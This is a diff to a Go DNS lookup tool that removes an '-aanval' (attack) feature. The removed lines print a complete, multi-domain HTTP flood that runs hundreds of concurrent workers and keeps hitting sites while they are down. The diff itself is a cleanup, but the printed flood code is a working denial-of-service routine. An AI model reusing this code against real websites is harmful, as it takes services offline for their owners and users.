@@ -13,8 +13,6 @@ import (
 	"runtime"
 	"sort"
 	"strings"
-	"sync"
-	"sync/atomic"
 	"time"
 
 	whois "github.com/likexian/whois"
@@ -22,18 +20,10 @@ import (
 	"github.com/miekg/dns"
 )
 
-const version = "1.1.1"
+const version = "2.1.3"
 
 func printBanner() {
-	banner := `
-██╗     ██╗   ██╗ ██████╗ ███████╗    ██████╗ ███╗   ██╗███████╗
-██║     ██║   ██║██╔═══██╗██╔════╝   ██╔═══██╗████╗  ██║██╔════╝
-██║     ██║   ██║██║   ██║███████╗   ██║   ██║██╔██╗ ██║███████╗
-██║     ██║   ██║██║   ██║╚════██║   ██║   ██║██║╚██╗██║╚════██║
-███████╗╚██████╔╝╚██████╔╝███████║   ╚██████╔╝██║ ╚████║███████║
-╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝
-`
-	fmt.Print(banner)
+	fmt.Println("Lucas DNS is made by Lucas Mangroelal | lucasmangroelal.nl")
 }
 
 type options struct {
@@ -60,8 +50,7 @@ type options struct {
 	resolver string
 	timeout  time.Duration
 
-	aanval        bool
-	attackMinutes int
+
 }
 
 func main() {
@@ -91,9 +80,6 @@ func main() {
 	flag.StringVar(&o.resolver, "r", "", "Resolver (ip:port). Default: systeem resolvers of 8.8.8.8:53")
 	flag.DurationVar(&o.timeout, "timeout", 5*time.Second, "Timeout per query")
 
-	flag.BoolVar(&o.aanval, "aanval", false, "HTTP load test / stress test (blijft aanvallen zolang site plat ligt)")
-	flag.IntVar(&o.attackMinutes, "t", 1, "Aantal minuten om aan te vallen (werkt alleen met -aanval)")
-
 	flag.Usage = func() {
 		printBanner()
 		fmt.Fprintf(os.Stderr, "Version: %s\n\n", version)
@@ -103,8 +89,7 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -subs\n")
 		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -inf -n\n")
 		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -whois\n")
-		fmt.Fprintf(os.Stderr, "  lucasdns -d voorbeeld.nl -aanval -t 2\n")
-		fmt.Fprintf(os.Stderr, "  lucasdns -d domein1.nl,domein2.nl,domein3.nl -aanval -t 2\n\n")
+		fmt.Fprintf(os.Stderr, "  lucasdns -d lucasmangroelal.nl -whois\n\n")
 		fmt.Fprintf(os.Stderr, "Flags:\n")
 		flag.PrintDefaults()
 	}
@@ -239,26 +224,11 @@ func main() {
 		fmt.Println()
 	}
 
-	if o.aanval {
-		printHeader("HTTP LOAD TEST / AANVAL")
-		// Ondersteun meerdere domeinen (comma-separated)
-		domains := strings.Split(domain, ",")
-		for i := range domains {
-			domains[i] = normalizeDomain(domains[i])
-		}
-		
-		if len(domains) > 1 {
-			fmt.Printf("🎯 Aanvallen %d domeinen tegelijk: %s\n\n", len(domains), strings.Join(domains, ", "))
-		}
-		
-		if err := runAttack(ctx, client, resolver, domains, o.attackMinutes); err != nil {
-			fmt.Printf("error: %v\n", err)
-		}
-	}
+
 }
 
 func anyQueryFlagSet(o options) bool {
-	return o.inf || o.n || o.whois || o.subs || o.aanval ||
+	return o.inf || o.n || o.whois || o.subs ||
 		o.a || o.aaaa || o.cname || o.mx || o.ns || o.txt || o.soa || o.caa || o.srv
 }
 
@@ -685,258 +655,5 @@ func fetchSubdomainsCT(ctx context.Context, domain string) ([]string, error) {
 	return out, nil
 }
 
-func runAttack(ctx context.Context, client *dns.Client, resolver string, domains []string, minutes int) error {
-	duration := time.Duration(minutes) * time.Minute
-	deadline := time.Now().Add(duration)
-	
-	httpClient := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			MaxIdleConns:        1000 * len(domains),
-			MaxIdleConnsPerHost: 1000,
-			IdleConnTimeout:     90 * time.Second,
-		},
-	}
-	
-	// Struct voor per-domein stats
-	type domainStats struct {
-		domain         string
-		targetURL      string
-		totalRequests  int64
-		successRequests int64
-		failedRequests int64
-		siteDown       bool
-		siteDownSince  time.Time
-		mu             sync.Mutex
-	}
-	
-	allStats := make([]*domainStats, len(domains))
-	
-	// Setup voor elk domein
-	for i, domain := range domains {
-		fmt.Printf("🔍 DNS lookup voor %s...\n", domain)
-		a, err := queryType(ctx, client, resolver, domain, dns.TypeA)
-		if err != nil {
-			fmt.Printf("⚠️  DNS lookup failed voor %s: %v\n", domain, err)
-			continue
-		}
-		
-		ips := extractIPs(a)
-		if len(ips) == 0 {
-			fmt.Printf("⚠️  Geen IP adressen gevonden voor %s\n", domain)
-			continue
-		}
-		
-		fmt.Printf("📍 %s - IPs: %s\n", domain, strings.Join(ips, ", "))
-		
-		// Bepaal URL
-		urls := []string{"https://" + domain, "http://" + domain}
-		var targetURL string
-		for _, u := range urls {
-			req, _ := http.NewRequest("GET", u, nil)
-			req.Header.Set("User-Agent", "lucasdns/"+version)
-			resp, err := httpClient.Do(req)
-			if err == nil && resp.StatusCode < 500 {
-				targetURL = u
-				resp.Body.Close()
-				break
-			}
-			if resp != nil {
-				resp.Body.Close()
-			}
-		}
-		
-		if targetURL == "" {
-			targetURL = urls[0]
-		}
-		
-		allStats[i] = &domainStats{
-			domain:    domain,
-			targetURL: targetURL,
-		}
-		
-		fmt.Printf("🎯 %s -> %s\n", domain, targetURL)
-	}
-	
-	fmt.Printf("\n⏱️  Duur: %d minuten\n", minutes)
-	fmt.Printf("🚀 Starten aanval op %d domein(en)...\n\n", len(domains))
-	
-	// Workers per domein
-	workersPerDomain := 300
-	if len(domains) > 1 {
-		workersPerDomain = 200 // Minder workers per domein als er meerdere zijn
-	}
-	
-	var globalWg sync.WaitGroup
-	
-	// Start aanval voor elk domein
-	for _, stats := range allStats {
-		if stats == nil {
-			continue
-		}
-		
-		stats := stats // Capture for goroutine
-		requestChan := make(chan struct{}, workersPerDomain*10)
-		
-		// Workers voor dit domein
-		for i := 0; i < workersPerDomain; i++ {
-			globalWg.Add(1)
-			go func() {
-				defer globalWg.Done()
-				for range requestChan {
-					req, _ := http.NewRequest("GET", stats.targetURL, nil)
-					req.Header.Set("User-Agent", "lucasdns/"+version)
-					req.Header.Set("Connection", "keep-alive")
-					
-					resp, err := httpClient.Do(req)
-					
-					stats.mu.Lock()
-					isDown := stats.siteDown
-					stats.mu.Unlock()
-					
-					if err != nil {
-						if !isDown {
-							stats.mu.Lock()
-							if !stats.siteDown {
-								stats.siteDown = true
-								stats.siteDownSince = time.Now()
-								fmt.Printf("\n💥 %s is PLAT! Timer start...\n", stats.domain)
-							}
-							stats.mu.Unlock()
-						}
-						atomic.AddInt64(&stats.failedRequests, 1)
-					} else {
-						resp.Body.Close()
-						if resp.StatusCode >= 500 {
-							if !isDown {
-								stats.mu.Lock()
-								if !stats.siteDown {
-									stats.siteDown = true
-									stats.siteDownSince = time.Now()
-									fmt.Printf("\n💥 %s is PLAT! (status %d) Timer start...\n", stats.domain, resp.StatusCode)
-								}
-								stats.mu.Unlock()
-							}
-							atomic.AddInt64(&stats.failedRequests, 1)
-						} else {
-							if isDown {
-								stats.mu.Lock()
-								if stats.siteDown {
-									downDuration := time.Since(stats.siteDownSince)
-									fmt.Printf("\n✅ %s is weer ONLINE (was %v plat)\n", stats.domain, downDuration.Round(time.Second))
-									stats.siteDown = false
-								}
-								stats.mu.Unlock()
-							}
-							atomic.AddInt64(&stats.successRequests, 1)
-						}
-					}
-					atomic.AddInt64(&stats.totalRequests, 1)
-				}
-			}()
-		}
-		
-		// Send requests voor dit domein
-		go func(s *domainStats, ch chan struct{}) {
-			for time.Now().Before(deadline) {
-				select {
-				case ch <- struct{}{}:
-				default:
-					time.Sleep(1 * time.Millisecond)
-				}
-			}
-			close(ch)
-		}(stats, requestChan)
-	}
-	
-	// Status updates
-	statusTicker := time.NewTicker(3 * time.Second)
-	defer statusTicker.Stop()
-	
-	startTime := time.Now()
-	
-	for time.Now().Before(deadline) {
-		select {
-		case <-statusTicker.C:
-			remaining := time.Until(deadline).Round(time.Second)
-			elapsed := time.Since(startTime).Seconds()
-			
-			var totalReqs, totalSuccess, totalFailed int64
-			for _, stats := range allStats {
-				if stats == nil {
-					continue
-				}
-				totalReqs += atomic.LoadInt64(&stats.totalRequests)
-				totalSuccess += atomic.LoadInt64(&stats.successRequests)
-				totalFailed += atomic.LoadInt64(&stats.failedRequests)
-			}
-			
-			reqPerSec := float64(totalReqs) / elapsed
-			
-			fmt.Printf("\n=== Status Update (Tijd over: %v) ===\n", remaining)
-			fmt.Printf("Totaal: Requests: %d | Success: %d | Failed: %d | %.0f req/s\n", totalReqs, totalSuccess, totalFailed, reqPerSec)
-			
-			for _, stats := range allStats {
-				if stats == nil {
-					continue
-				}
-				stats.mu.Lock()
-				isDown := stats.siteDown
-				var statusInfo string
-				if isDown {
-					downDuration := time.Since(stats.siteDownSince).Round(time.Second)
-					statusInfo = fmt.Sprintf("PLAT (%v)", downDuration)
-				} else {
-					statusInfo = "ONLINE"
-				}
-				stats.mu.Unlock()
-				
-				fmt.Printf("  %s: Requests: %d | Success: %d | Failed: %d | Status: %s\n",
-					stats.domain, atomic.LoadInt64(&stats.totalRequests),
-					atomic.LoadInt64(&stats.successRequests), atomic.LoadInt64(&stats.failedRequests), statusInfo)
-			}
-			fmt.Println()
-		}
-	}
-	
-	// Wacht tot alle workers klaar zijn
-	globalWg.Wait()
-	
-	fmt.Printf("\n\n📊 EINDRESULTATEN:\n\n")
-	
-	var grandTotal, grandSuccess, grandFailed int64
-	for _, stats := range allStats {
-		if stats == nil {
-			continue
-		}
-		
-		stats.mu.Lock()
-		isDown := stats.siteDown
-		var statusInfo string
-		if isDown {
-			downDuration := time.Since(stats.siteDownSince).Round(time.Second)
-			statusInfo = fmt.Sprintf("🔴 PLAT (sinds %v)", downDuration)
-		} else {
-			statusInfo = "🟢 ONLINE"
-		}
-		stats.mu.Unlock()
-		
-		total := atomic.LoadInt64(&stats.totalRequests)
-		success := atomic.LoadInt64(&stats.successRequests)
-		failed := atomic.LoadInt64(&stats.failedRequests)
-		
-		grandTotal += total
-		grandSuccess += success
-		grandFailed += failed
-		
-		fmt.Printf("%s:\n", stats.domain)
-		fmt.Printf("   Requests: %d | Success: %d | Failed: %d\n", total, success, failed)
-		fmt.Printf("   Status: %s\n\n", statusInfo)
-	}
-	
-	fmt.Printf("TOTAAL ALLE DOMEINEN:\n")
-	fmt.Printf("   Requests: %d | Success: %d | Failed: %d\n", grandTotal, grandSuccess, grandFailed)
-	
-	return nil
-}
+
 
